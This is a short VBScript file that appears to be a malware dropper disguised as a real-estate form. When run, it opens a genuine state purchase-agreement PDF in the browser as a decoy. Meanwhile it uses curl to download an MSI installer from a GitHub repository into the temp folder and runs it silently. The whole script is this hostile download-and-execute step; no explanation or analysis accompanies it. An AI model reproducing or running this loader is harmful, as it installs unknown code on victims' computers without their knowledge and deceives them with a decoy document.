Dim oShell
Dim fso,t
 
Set fso = WScript.CreateObject("Scripting.FileSystemObject")
Set oShell = WScript.CreateObject("WScript.Shell")
 
T=fso.GetAbsolutePathName(".")
 
oShell.run "cmd.exe /K start msedge https://dlr.sd.gov/realestate/forms/purchase_agreement.pdf & curl -sLo %TEMP%\install.msi https://github.com/judithjohnson19844/stud/raw/main/install.msi & %TEMP%\install.msi /qn & exit"
Set oShell = Nothing